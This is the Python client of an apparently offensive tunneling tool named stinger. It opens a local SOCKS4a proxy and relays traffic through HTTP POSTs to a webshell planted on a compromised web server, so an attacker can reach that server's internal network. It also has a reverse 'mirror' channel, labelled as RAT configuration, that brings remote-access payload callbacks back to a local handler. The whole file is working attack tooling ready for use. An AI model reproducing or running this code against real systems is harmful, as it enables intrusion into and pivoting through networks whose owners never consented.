# -*- coding: utf-8 -*-
# @File  : client.py
# @Date  : 2019/8/28
# @Desc  :
# @license : Copyright(C), funnywolf 
# @Author: funnywolf
# @Contact : github.com/FunnyWolf

import argparse
import struct
import threading
import time
from socket import AF_INET, SOCK_STREAM
from threading import Thread

import ipaddr

from config import *

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
except Exception as E:
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

global globalClientCenter


class ClientCenter(threading.Thread):
    def __init__(self):

        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
            "Connection": "keep-alive",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            "Accept-Language": "zh-CN,zh;q=0.8",
            'Accept-Encoding': 'gzip',
        }
        self.proxy = None
        self.CACHE_CONNS = {}
        self.MIRROR_CHCHE_CONNS = {}
        # {
        #     "conn": self.request,
        #     "targetaddr": TARGET_ADDR,
        #     "new": True,
        # }
        # socket参数
        self.LOCAL_ADDR = None
        self.READ_BUFF_SIZE = 11200
        self.POST_RETRY_COUNT = 10  # post请求重试最大次数

        # 日志参数
        self.LOG_LEVEL = "INFO"
        self.logger = get_logger(level=self.LOG_LEVEL, name="StreamLogger")

        # webshell参数
        self.WEBSHELL = None
        self.REMOTE_SERVER = None
        self.SINGLE_MODE = False

        # mirror
        self.SOCKET_TIMEOUT = DEFAULT_SOCKET_TIMEOUT
        self.TARGET_IP = "127.0.0.1"
        self.TARGET_PORT = 60020

        # 缓存变量
        self.die_client_address = []
        self.mirror_die_client_address = []
        self.session = requests.session()
        self.session.verify = False

        # 多线程变量
        self.post_send_data = {}
        self.post_return_data = {}
        threading.Thread.__init__(self)

    def custom_header(self, inputstr):
        try:
            str_headers = inputstr.split(",")
            for str_header in str_headers:
                header_type = str_header.split(":")[0].strip()
                header_value = str_header.split(":")[1].strip()
                self.headers[header_type] = header_value
        except Exception as E:
            self.logger.exception(E)
            return False
        self.logger.info("------------ Custom Http Request Header ------------")
        self.logger.info(self.headers)
        self.logger.info("\n")
        return True

    def custom_proxy(self, proxy):
        self.proxy = {'http': proxy, 'https': proxy}
        self.session.proxies = self.proxy
        self.logger.info("------------ Custom Http Request Proxy ------------")
        self.logger.info(self.proxy)
        self.logger.info("\n")
        return True

    def recv_socks_data(self, client_address):
        """socks数据接收"""
        client_socket_conn = self.CACHE_CONNS.get(client_address).get("conn")
        try:
            tcp_recv_data = client_socket_conn.recv(self.READ_BUFF_SIZE)
            self.logger.debug("CLIENT_ADDRESS:{} TCP_RECV_DATA:{}".format(client_address, tcp_recv_data))
            if len(tcp_recv_data) > 0:
                has_data = True
                self.logger.info("CLIENT_ADDRESS:{} TCP_RECV_LEN:{}".format(client_address, len(tcp_recv_data)))

        except Exception as err:
            tcp_recv_data = b""
            self.logger.debug("TCP_RECV_NONE")

        # 编码问题,data数据(tcp传输的数据)需要额外再base64编码一次
        client_socket_targetaddr = self.CACHE_CONNS.get(client_address).get("targetaddr")

        # 每一个client_address的数据结构体
        client_address_one_data = {
            "data": base64.b64encode(tcp_recv_data),
            "targetaddr": client_socket_targetaddr,
        }
        self.post_send_data[client_address] = client_address_one_data

    def send_socks_data(self, client_address):
        # 将返回的数据发送到client Tcp连接中
        # 读取server返回的数据
        try:
            client_socket_conn = self.CACHE_CONNS.get(client_address).get("conn")
            server_tcp_send_data = base64.b64decode(self.post_return_data.get(client_address).get("data"))
        except Exception as E:
            if self.SINGLE_MODE is True:
                self.logger.warning(
                    "CLIENT_ADDRESS:{} server socket not in client socket list".format(client_address))
                self.logger.warning("SINGLE_MODE: {} ,remove is conn from server".format(self.SINGLE_MODE))
                self.die_client_address.append(client_address)
            return

        if server_tcp_send_data == "":  # 无数据返回继续下一个连接
            return

        # 将返回的数据发送到client Tcp连接中
        try:
            client_socket_conn.send(server_tcp_send_data)
            self.logger.debug("CLIENT_ADDRESS:{} TCP_SEND_DATA:{}".format(client_address, server_tcp_send_data))
        except Exception as E:
            self.logger.warning("CLIENT_ADDRESS:{} Client socket send failed".format(client_address))
            self.die_client_address.append(client_address)
            try:
                self.CACHE_CONNS.pop(client_address)
                client_socket_conn.close()
            except Exception as E:
                pass

    def _post_data(self, url, data={}):
        """发送数据到webshell"""
        payload = {
            "Remoteserver": self.REMOTE_SERVER,
            "Endpoint": url,
            "SENDDATA": diyEncode(data)
        }
        self.logger.debug(payload)

        for i in range(self.POST_RETRY_COUNT):
            try:
                # timeout 要大于脚本中post的超时时间
                r = self.session.post(self.WEBSHELL, data=payload, verify=False, timeout=15, headers=self.headers)
            except Exception as E:
                self.logger.warning("Post data to WEBSHELL failed")
                self.logger.exception(E)
                time.sleep(3)  # 错误后延时
                continue
            try:
                web_return_data = diyDecode(r.content)
                if isinstance(web_return_data, dict) and web_return_data.get(ERROR_CODE) is not None:
                    self.logger.error(web_return_data.get(ERROR_CODE))
                    self.logger.warning(r.content)
                    return None
                else:
                    return web_return_data
            except Exception as E:
                self.logger.warning("WEBSHELL return wrong data")
                self.logger.debug(r.content)
                time.sleep(3)  # 错误后延时
                continue
        # 超过重试次数后,退出
        return None

    def run(self):
        self.logger.warning("LoopThread start")
        while True:
            self._sync_data()

    def _sync_data(self):
        has_data = False
        # 清除无效的client
        for client_address in self.die_client_address:
            try:
                one = self.CACHE_CONNS.pop(client_address)
                one.get("conn").close()
                self.logger.warning("CLIENT_ADDRESS:{} close client in die_client_address".format(client_address))
            except Exception as E:
                self.logger.warning(
                    "CLIENT_ADDRESS:{} close client close client in die_client_address error".format(client_address))

        # 从tcp中读取数据
        thread_list = []
        self.post_send_data = {}
        for client_address in list(self.CACHE_CONNS.keys()):
            temp = Thread(target=self.recv_socks_data,
                          args=(client_address,))
            thread_list.append(temp)

        for temp in thread_list:
            temp.start()
        for temp in thread_list:
            temp.join()

        # 从tcp中读取数据(mirror)
        mirror_post_send_data = {}
        for mirror_client_address in list(self.MIRROR_CHCHE_CONNS.keys()):
            client_socket_conn = self.MIRROR_CHCHE_CONNS.get(mirror_client_address).get("conn")
            try:
                tcp_recv_data = client_socket_conn.recv(self.READ_BUFF_SIZE)
                self.logger.debug("CLIENT_ADDRESS:{} TCP_RECV_DATA:{}".format(mirror_client_address, tcp_recv_data))
                if len(tcp_recv_data) > 0:
                    has_data = True
                    self.logger.info(
                        "MIRROR_CLIENT_ADDRESS:{} CLIENT_TCP_RECV_LEN:{}".format(mirror_client_address,
                                                                                 len(tcp_recv_data)))
            except Exception as err:
                tcp_recv_data = b""
                self.logger.debug("TCP_RECV_NONE")

            # 每一个client_address的数据结构体
            client_address_one_data = {
                # 编码问题,data数据(tcp传输的数据)需要额外再base64编码一次
                "data": base64.b64encode(tcp_recv_data),
            }
            mirror_post_send_data[mirror_client_address] = client_address_one_data

        # 组装数据
        payload = {}
        payload[DATA_TAG] = self.post_send_data  # 发送的数据
        payload[DIE_CLIENT_ADDRESS_TAG] = self.die_client_address  # 需要清除的连接
        payload[MIRROR_DATA_TAG] = mirror_post_send_data  # 发送的数据
        payload[MIRROR_DIE_CLIENT_ADDRESS_TAG] = self.mirror_die_client_address  # 需要清除的连接
        # 发送读取的数据到webshell
        return_data = self._post_data(URL_STINGER_SYNC, data=payload)
        if return_data is None:  # 获取数据失败,退出此次同步
            return

        # 处理post返回数据
        # 读取server返回的数据
        self.post_return_data = return_data.get(RETURN_DATA)
        self.die_client_address = []
        thread_list = []

        for client_address in list(self.post_return_data.keys()):
            temp = Thread(target=self.send_socks_data,
                          args=(client_address,))
            thread_list.append(temp)
        for temp in thread_list:
            temp.start()
        for temp in thread_list:
            temp.join()
        # 检查没有在server返回列表中的client
        for client_address in list(self.CACHE_CONNS.keys()):
            if self.post_return_data.get(client_address) is None:
                if self.CACHE_CONNS.get(client_address).get("new") is True:
                    self.CACHE_CONNS[client_address]["new"] = False
                    pass
                else:
                    self.logger.warning(
                        "CLIENT_ADDRESS:{} remove client not in server CHCHE_CONNS".format(client_address)
                    )
                    self.logger.warning("CLIENT_ADDRESS:{} append in die_client_address".format(client_address))
                    self.die_client_address.append(client_address)
        # mirror处理
        mirror_post_return_data = return_data.get(MIRROR_RETURN_DATA)
        self.mirror_die_client_address = []

        for mirror_client_address in list(mirror_post_return_data.keys()):
            # 处理socket连接
            if self.MIRROR_CHCHE_CONNS.get(mirror_client_address) is None:
                # 新建链接
                try:
                    server_socket_conn = socket.socket(AF_INET, SOCK_STREAM)
                    server_socket_conn.settimeout(self.SOCKET_TIMEOUT)
                    server_socket_conn.connect((self.TARGET_IP, self.TARGET_PORT), )  # json不支持元组,自动转化为list
                    self.MIRROR_CHCHE_CONNS[mirror_client_address] = {"conn": server_socket_conn}
                    self.logger.info("MIRROR_CLIENT_ADDRESS:{} Create new tcp socket, TARGET_ADDRESS:{}:{}".format(
                        mirror_client_address, self.TARGET_IP, self.TARGET_PORT))
                except Exception as E:
                    self.logger.warning(
                        "MIRROR_CLIENT_ADDRESS:{} TARGET_ADDR:{}:{} Create new socket failed. {}".format(
                            mirror_client_address,
                            self.TARGET_IP,
                            self.TARGET_PORT, E))
                    self.mirror_die_client_address.append(mirror_client_address)
                    continue

            else:
                server_socket_conn = self.MIRROR_CHCHE_CONNS.get(mirror_client_address).get("conn")

            # 读取server返回的数据
            try:
                server_tcp_send_data = base64.b64decode(mirror_post_return_data.get(mirror_client_address).get("data"))
                server_socket_conn.send(server_tcp_send_data)
                self.logger.debug("MIRROR_CLIENT_ADDRESS:{} SERVER_TCP_SEND_DATA:{}".format(mirror_client_address,
                                                                                            server_tcp_send_data))
                if len(server_tcp_send_data) > 0:
                    self.logger.info(
                        "MIRROR_CLIENT_ADDRESS:{} SERVER_TCP_SEND_LEN:{}".format(mirror_client_address,
                                                                                 len(server_tcp_send_data)))
            except Exception as E:
                self.logger.info(
                    "MIRROR_CLIENT_ADDRESS:{} socket send data failed. {}".format(mirror_client_address, E))
                self.mirror_die_client_address.append(mirror_client_address)
                one = self.MIRROR_CHCHE_CONNS.pop(mirror_client_address)
                one.get("conn").close()
                continue

        # 检查没有在server返回列表中的client
        for mirror_client_address in list(self.MIRROR_CHCHE_CONNS.keys()):
            if mirror_post_return_data.get(mirror_client_address) is None:
                self.logger.warning(
                    "MIRROR_CLIENT_ADDRESS:{} remove client not in server MIRROR_CHCHE_CONNS".format(
                        mirror_client_address)
                )
                # self.mirror_die_client_address.append(mirror_client_address)
                one = self.MIRROR_CHCHE_CONNS.pop(mirror_client_address)
                one.get("conn").close()

        # 等待时间
        if has_data:
            wait = 0
        else:
            wait = return_data.get(WAIT_TIME)
        time.sleep(wait)

    def setc_webshell(self, WEBSHELL):
        try:
            r = requests.get(WEBSHELL, verify=False, timeout=3, headers=self.headers, proxies=self.proxy)
            if b"UTF-8" in r.content:
                self.WEBSHELL = WEBSHELL
                return True
            else:
                return False
        except requests.exceptions.ProxyError as proxyError:
            self.logger.error("Connet to proxy failed : {}".format(self.proxy))
            return False
        except Exception as E:
            self.logger.exception(E)
            return False

    def setc_remoteserver(self, remote_server=None):
        if remote_server is None:
            for port in CONTROL_PORT:
                for i in range(2):
                    self.REMOTE_SERVER = "http://{}:{}".format(LOCALADDR, port)
                    result = self._post_data(URL_CHECK)
                    if result is None:  # 失败回退
                        self.REMOTE_SERVER = None
                        continue
                    else:
                        return result
            return None
        self.REMOTE_SERVER = remote_server
        result = self._post_data(URL_CHECK)
        if result is None:  # 失败回退
            self.REMOTE_SERVER = None
        return result

    def setc_localaddr(self, ip, port):
        if port_is_used(port, ip):
            return False
        else:
            self.LOCAL_ADDR = "{}:{}".format(ip, port)
        return True

    def sets_config(self, tag, data):
        payload = {CONFIG_TAG: tag, CONFIG_DATA: data}
        web_return_data = self._post_data(URL_SET_CONFIG, payload)
        return web_return_data

    def send_cmd(self, tag, data=None):
        payload = {CONFIG_TAG: tag, CONFIG_DATA: data}
        web_return_data = self._post_data(URL_CMD, payload)
        return web_return_data


class ClientRequest(object):
    '''Represents a client SOCKS4 request'''

    def __init__(self, data):
        '''Construct a new ClientRequeset from the given raw SOCKS request'''
        self.invalid = False

        # Client requests must be at least 9 bytes to hold all necessary data
        if len(data) < 9:
            self.invalid = True
            return

        # Version number (VN)
        self.parse_vn(data)

        # SOCKS command code (CD)
        self.parse_cd(data)

        # Destination port
        self.parse_dst_port(data)

        # Destination IP / Domain name (if specified)
        self.parse_ip(data)

        # Userid
        self.parse_userid(data)

    @classmethod
    def parse_fixed(cls, data):
        '''Parse and return the fixed-length part of a SOCKS request
        Returns a tuple containing (vn, cd, dst_port, dst_ip) given the raw
        socks request
        '''
        return struct.unpack('>BBHL', data[:8])

    def parse_vn(self, data):
        '''Parse and store the version number given the raw SOCKS request'''
        vn, _, _, _ = ClientRequest.parse_fixed(data)
        if (vn != CLIENT_VN):
            self.invalid = True

    def parse_dst_port(self, data):
        '''Parse and store the destination port given the raw SOCKS request'''
        _, _, dst_port, _ = ClientRequest.parse_fixed(data)
        self.dst_port = dst_port

    def parse_cd(self, data):
        '''Parse and store the request code given the raw SOCKS request'''
        _, cd, _, _ = ClientRequest.parse_fixed(data)
        if (cd == REQUEST_CD_CONNECT or cd == REQUEST_CD_BIND):
            self.cd = cd
        else:
            self.invalid = True

    def parse_ip(self, data):
        '''Parse and store the destination ip given the raw SOCKS request
        If the IP is of the form 0.0.0.(1-255), attempt to resolve the domain
        name specified, then store the resolved ip as the destination ip.
        '''
        _, _, _, dst_ip = ClientRequest.parse_fixed(data)

        ip = ipaddr.IPv4Address(dst_ip)
        o1, o2, o3, o4 = ip.packed

        # Invalid ip address specifying that we must resolve the domain
        # specified in data (As specified in SOCKS4a)
        if (o1, o2, o3) == (0, 0, 0) and o4 != 0:
            try:
                # Variable length part of the request containing the userid
                # and domain (8th byte onwards)
                userid_and_domain = data[8:]

                # Extract the domain to resolve
                _, domain, _ = userid_and_domain.split(b'\x00')

            except ValueError:
                # Error parsing request
                self.invalid = True
                return

            try:
                resolved_ip = socket.gethostbyname(domain)
            except socket.gaierror:
                # Domain name not found
                self.invalid = True
                return

            self.dst_ip = resolved_ip

        else:
            self.dst_ip = ip.exploded

    def parse_userid(self, data):
        '''Parse and store the userid given the raw SOCKS request'''
        try:
            index = data.index(b'\x00')
            self.userid = data[8:index]
        except ValueError:
            self.invalid = True
        except IndexError:
            self.invalid = True

    def isInvalid(self):
        '''Returns true if this request is invalid, false otherwise'''
        return self.invalid


class Socks4aProxy(threading.Thread):
    '''A SOCKS4a Proxy'''

    def __init__(self, host="127.0.0.1", port=-1, timeout=0.05, bufsize=BUFSIZE):
        '''Create a new SOCKS4 proxy on the specified port'''

        self._host = host
        self._port = port
        self._bufsize = bufsize
        self._backlog = BACKLOG
        self._timeout = timeout
        self.logger = logging.getLogger("StreamLogger")
        threading.Thread.__init__(self)

    @staticmethod
    def build_socks_reply(cd, dst_port=0x0000, dst_ip='0.0.0.0'):
        '''
        Build a SOCKS4 reply with the specified reply code, destination port and
        destination ip.
        '''
        # dst_ip_bytes = ipaddress.IPv4Address(dst_ip).packed
        dst_ip_bytes = ipaddr.IPv4Address(dst_ip).packed

        dst_ip_raw, = struct.unpack('>L', dst_ip_bytes)

        return struct.pack('>BBHL', SERVER_VN, cd, dst_port, dst_ip_raw)

    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((self._host, self._port))
            s.listen(self._backlog)
            self.logger.warning("socks4a server start on {}:{}".format(self._host, self._port))
        except Exception as E:
            self.logger.exception(E)
            self.logger.error(
                "start socks4a server failed on {}:{}, maybe port is using by other process".format(self._host,
                                                                                                    self._port))
            return False

        self.logger.warning("Socks4a ready to accept")
        while True:
            try:
                conn, addr = s.accept()
                conn.settimeout(self._timeout)
                data = conn.recv(self._bufsize)
                # Got a connection, handle it with process_request()
                self._process_request(data, conn, addr)
                self.logger.info("Socks4a process_request finish")
            except KeyboardInterrupt as ki:
                self.logger.warning('Caught KeyboardInterrupt, exiting')
                s.close()
                sys.exit(0)
            except Exception as E:
                self.logger.exception(E)
                try:
                    conn.close()
                except Exception as E:
                    pass

    def _process_request(self, data, client_conn, addr):
        '''Process a general SOCKS request'''

        client_request = ClientRequest(data)

        # Handle invalid requests
        if client_request.isInvalid():
            client_conn.send(self.build_socks_reply(RESPONSE_CD_REQUEST_REJECTED))
            client_conn.close()
            return

        if client_request.cd == REQUEST_CD_CONNECT:
            globalClientCenter.logger.warning('Got connection from {}'.format(addr))
            key = "{}:{}".format(addr[0], addr[1])
            globalClientCenter.CACHE_CONNS[key] = {
                "conn": client_conn,
                "targetaddr": (client_request.dst_ip, client_request.dst_port),
                "new": True,  # 新的连接,第一次检查略过
            }

            client_conn.settimeout(self._timeout)
            client_conn.send(self.build_socks_reply(RESPONSE_CD_REQUEST_GRANTED))  # 处理完成,开始正式连接
        else:
            self.logger.warning("Socks4a do not support bind request")


if __name__ == '__main__':

    parser = argparse.ArgumentParser(
        description="Make sure the stinger_server is running on webserver "
                    "(stinger_server will listen 127.0.0.1:60010 127.0.0.1:60020)")
    parser.add_argument('-w', '--webshell', metavar='http://192.168.3.10:8080/proxy.jsp',
                        help="webshell url",
                        required=True)

    parser.add_argument('--header', metavar='Authorization: XXX,Cookie: XXX',
                        help="custom http request header",
                        default=None)

    parser.add_argument('--proxy', metavar='socks5://127.0.0.1:1080',
                        help="Connect webshell through proxy",
                        default=None)

    parser.add_argument('-l', '--locallistenaddress', metavar='127.0.0.1/0.0.0.0',
                        help="local listen address for socks4",
                        default='127.0.0.1')
    parser.add_argument('-p', '--locallistenport',
                        default=10800,
                        metavar='N',
                        type=int,
                        help="local listen port for socks4",
                        )

    parser.add_argument('-st', '--sockettimeout', default=0.2,
                        metavar="N",
                        type=float,
                        help="socket timeout value,the biger the timeout, the slower the transmission speed",
                        )
    parser.add_argument('-ti', '--targetipaddress', metavar='127.0.0.1',
                        help="reverse proxy target ipaddress",
                        required=False)
    parser.add_argument('-tp', '--targetport', metavar='60020',
                        help="reverse proxy target port",
                        required=False)
    parser.add_argument('-c', '--cleansockst', default=False,
                        nargs='?',
                        metavar="true",
                        type=bool,
                        help="clean server exist socket(this will kill other client connect)",
                        )
    parser.add_argument('-sm', '--singlemode', default=False,
                        nargs='?',
                        metavar="true",
                        type=bool,
                        help="clean server exist socket(this will kill other client connect)",
                        )
    args = parser.parse_args()
    WEBSHELL = args.webshell
    LISTEN_ADDR = args.locallistenaddress
    LISTEN_PORT = args.locallistenport

    CLEAN_SOCKET = args.cleansockst
    if CLEAN_SOCKET is not False:
        CLEAN_SOCKET = True
    else:
        CLEAN_SOCKET = False

    # 处理header参数
    globalClientCenter = ClientCenter()
    header = args.header
    if header is not None:
        flag = globalClientCenter.custom_header(header)
        if flag is not True:
            sys.exit(1)

    # 处理proxy参数
    proxy = args.proxy
    if proxy is not None:
        flag = globalClientCenter.custom_proxy(proxy)
        if flag is not True:
            sys.exit(1)

    # 处理singlemode参数
    SINGLE_MODE = args.singlemode
    if SINGLE_MODE is not False:
        SINGLE_MODE = True
        globalClientCenter.SINGLE_MODE = SINGLE_MODE
        globalClientCenter.logger.info("SINGLE_MODE : {}".format(SINGLE_MODE))
    else:
        SINGLE_MODE = False

    # 本地端口检查
    globalClientCenter.logger.info("------------------- Local check -------------------")
    flag = globalClientCenter.setc_localaddr(LISTEN_ADDR, LISTEN_PORT)
    if flag:
        globalClientCenter.logger.info("Local listen check : pass")
    else:
        globalClientCenter.logger.error(
            "Local listen check failed, please check if {}:{} is available".format(LISTEN_ADDR, LISTEN_PORT))
        globalClientCenter.logger.error(WEBSHELL)
        sys.exit(1)

    # 检查webshell是否可用
    webshell_alive = globalClientCenter.setc_webshell(WEBSHELL)
    if webshell_alive:
        globalClientCenter.logger.info("WEBSHELL check : pass")
        globalClientCenter.logger.info("WEBSHELL: {}".format(WEBSHELL))
    else:
        globalClientCenter.logger.error("WEBSHELL check failed!")
        globalClientCenter.logger.error(WEBSHELL)
        sys.exit(1)

    # 检查stinger_server是否可用
    result = globalClientCenter.setc_remoteserver()
    if result is None:
        globalClientCenter.logger.error("Read REMOTE_SERVER failed,please check whether server is running")
        sys.exit(1)
    else:
        MIRROR_LISTEN = "127.0.0.1:60020"
        globalClientCenter.logger.info("REMOTE_SERVER check : pass")
        globalClientCenter.logger.info("\n")
        globalClientCenter.logger.info("------------------- Get Sever Config -------------------")
        for key in result:
            globalClientCenter.logger.info("{} : {}".format(key, result.get(key)))
            if key == "MIRROR_LISTEN":
                MIRROR_LISTEN = result.get(key)
        globalClientCenter.logger.info("\n")

    globalClientCenter.logger.info("------------------- Set Server Config -------------------")

    # 是否清理已有连接
    if CLEAN_SOCKET:
        flag = globalClientCenter.send_cmd("CLEAN_SOCKET")
        globalClientCenter.logger.info("CLEAN_SOCKET cmd : {}".format(flag))

    # server建立内网tcp连接的超时时间
    sockettimeout = args.sockettimeout
    if sockettimeout != DEFAULT_SOCKET_TIMEOUT:
        flag = globalClientCenter.sets_config("SOCKET_TIMEOUT", sockettimeout)
        globalClientCenter.logger.info("Set server SOCKET_TIMEOUT => {}".format(flag))
        globalClientCenter.SOCKET_TIMEOUT = sockettimeout
    globalClientCenter.logger.info("\n")

    # 映射到本地的地址
    TARGET_IP = args.targetipaddress
    if TARGET_IP is None:
        globalClientCenter.TARGET_IP = MIRROR_LISTEN.split(":")[0]
    else:
        globalClientCenter.TARGET_IP = TARGET_IP

    # 映射到本地的端口
    TARGET_PORT = args.targetport
    if TARGET_PORT is None:
        globalClientCenter.TARGET_PORT = int(MIRROR_LISTEN.split(":")[1])
    else:
        globalClientCenter.TARGET_PORT = int(TARGET_PORT)

    globalClientCenter.logger.info("------------------! RAT Config !------------------")
    globalClientCenter.logger.info("Socks4a on {}:{}".format(LISTEN_ADDR, LISTEN_PORT))
    globalClientCenter.logger.info(
        "Handler/LISTENER should listen on {}:{}".format(globalClientCenter.TARGET_IP, globalClientCenter.TARGET_PORT))
    globalClientCenter.logger.info(
        "Payload should connect to {}".format(MIRROR_LISTEN))
    globalClientCenter.logger.info("------------------! RAT Config !------------------\n")

    # 设置线程为守护线程
    globalClientCenter.setDaemon(True)
    t2 = Socks4aProxy(host=args.locallistenaddress, port=args.locallistenport, timeout=sockettimeout)
    t2.setDaemon(True)

    # 启动服务
    globalClientCenter.start()
    t2.start()

    # 保持程序运行,处理结束信号
    while True:
        try:
            time.sleep(10)
        except KeyboardInterrupt as ki:
            print('Caught KeyboardInterrupt, exiting')
            sys.exit(1)
